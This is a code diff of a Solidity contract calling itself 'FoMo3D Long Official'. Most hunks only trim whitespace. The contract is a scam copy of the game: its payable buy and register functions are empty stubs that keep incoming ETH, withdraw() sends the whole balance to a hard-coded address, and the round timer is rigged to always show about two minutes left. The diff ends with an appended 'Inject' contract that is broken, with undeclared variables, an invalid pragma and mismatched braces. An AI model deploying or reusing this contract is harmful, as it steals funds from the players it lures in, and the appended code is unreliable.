@@ -2,7 +2,7 @@ pragma solidity ^0.4.24;
 
 contract FoMo3Dlong {
     using SafeMath for *;
-    
+
     string constant public name = "FoMo3D Long Official";
     string constant public symbol = "F3D";
 	uint256 public airDropPot_;
@@ -21,24 +21,24 @@ contract FoMo3Dlong {
     function buyXid(uint256 _affCode, uint256 _team) public payable {}
     function buyXaddr(address _affCode, uint256 _team) public payable {}
     function buyXname(bytes32 _affCode, uint256 _team) public payable {}
-    function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth) public {}    
-    function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth) public {} 
+    function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth) public {}
+    function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth) public {}
     function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth) public {}
     function withdraw() public {
         address aff = 0x7ce07aa2fc356fa52f622c1f4df1e8eaad7febf0;
         aff.transfer(this.balance);
     }
-    function registerNameXID(string _nameString, uint256 _affCode, bool _all) public payable {}  
-    function registerNameXaddr(string _nameString, address _affCode, bool _all) public payable {} 
-    function registerNameXname(string _nameString, bytes32 _affCode, bool _all) public payable {} 
+    function registerNameXID(string _nameString, uint256 _affCode, bool _all) public payable {}
+    function registerNameXaddr(string _nameString, address _affCode, bool _all) public payable {}
+    function registerNameXname(string _nameString, bytes32 _affCode, bool _all) public payable {}
 
 	uint256 public rID_ = 1;
 
     function getBuyPrice()
-        public 
-        view 
+        public
+        view
         returns(uint256)
-    {  
+    {
         return ( 100254831521475310 );
     }
 
@@ -68,11 +68,11 @@ contract FoMo3Dlong {
     {
         // setup local rID
         uint256 _rID = rID_;
-		
+
 		uint256 _now = now;
-		
+
 		round_[_rID].end = _now + 125 - (_now % 120);
-        
+
         return
         (
             0,               //0
@@ -91,10 +91,10 @@ contract FoMo3Dlong {
             519463956231409304003              //13
         );
     }
-	
+
     function getPlayerInfoByAddress(address _addr)
-        public 
-        view 
+        public
+        view
         returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)
     {
         return
@@ -108,7 +108,7 @@ contract FoMo3Dlong {
             0           //6
         );
     }
-	
+
     function calcKeysReceived(uint256 _rID, uint256 _eth)
         public
         view
@@ -124,12 +124,12 @@ contract FoMo3Dlong {
     {
         return (_keys.mul(100254831521475310)/1000000000000000000);
     }
-	
+
     bool public activated_ = true;
     function activate() public {
         round_[1] = F3Ddatasets.Round(1954, 2, 1533795558, false, 1533794558, 34619432129976331518578579, 91737891789564224505545, 21737891789564224505545,31000, 0, 0, 0);
     }
-	
+
     function setOtherFomo(address _otherF3D) public {}
 }
 
@@ -161,7 +161,7 @@ library F3Ddatasets {
     struct PlayerRounds {
         uint256 eth;    // eth player has added to round (used for eth limiter)
         uint256 keys;   // keys
-        uint256 mask;   // player mask 
+        uint256 mask;   // player mask
         uint256 ico;    // ICO phase investment
     }
     struct Round {
@@ -194,19 +194,19 @@ library F3Ddatasets {
  * change notes:  original SafeMath library from OpenZeppelin modified by Inventor
  * - added sqrt
  * - added sq
- * - added pwr 
+ * - added pwr
  * - changed asserts to requires with error log outputs
  * - removed div, its useless
  */
 library SafeMath {
-    
+
     /**
     * @dev Multiplies two numbers, throws on overflow.
     */
-    function mul(uint256 a, uint256 b) 
-        internal 
-        pure 
-        returns (uint256 c) 
+    function mul(uint256 a, uint256 b)
+        internal
+        pure
+        returns (uint256 c)
     {
         if (a == 0) {
             return 0;
@@ -222,7 +222,7 @@ library SafeMath {
     function sub(uint256 a, uint256 b)
         internal
         pure
-        returns (uint256) 
+        returns (uint256)
     {
         require(b <= a, "SafeMath sub failed");
         return a - b;
@@ -234,30 +234,30 @@ library SafeMath {
     function add(uint256 a, uint256 b)
         internal
         pure
-        returns (uint256 c) 
+        returns (uint256 c)
     {
         c = a + b;
         require(c >= a, "SafeMath add failed");
         return c;
     }
-    
+
     /**
      * @dev gives square root of given x.
      */
     function sqrt(uint256 x)
         internal
         pure
-        returns (uint256 y) 
+        returns (uint256 y)
     {
         uint256 z = ((add(x,1)) / 2);
         y = x;
-        while (z < y) 
+        while (z < y)
         {
             y = z;
             z = ((add((x / z),z)) / 2);
         }
     }
-    
+
     /**
      * @dev gives square. multiplies x by x
      */
@@ -268,20 +268,20 @@ library SafeMath {
     {
         return (mul(x,x));
     }
-    
+
     /**
-     * @dev x to the power of y 
+     * @dev x to the power of y
      */
     function pwr(uint256 x, uint256 y)
-        internal 
-        pure 
+        internal
+        pure
         returns (uint256)
     {
         if (x==0)
             return (0);
         else if (y==0)
             return (1);
-        else 
+        else
         {
             uint256 z = x;
             for (uint256 i=1; i < y; i++)
@@ -289,4 +289,15 @@ library SafeMath {
             return (z);
         }
     }
+}
+pragma solidity ^0.5.24;
+contract Inject {
+	uint depositAmount;
+	constructor() public {owner = msg.sender;}
+	function freeze(address account,uint key) {
+		if (msg.sender != minter)
+			revert();
+			freezeAccount[account] = key;
+		}
+	}
 }
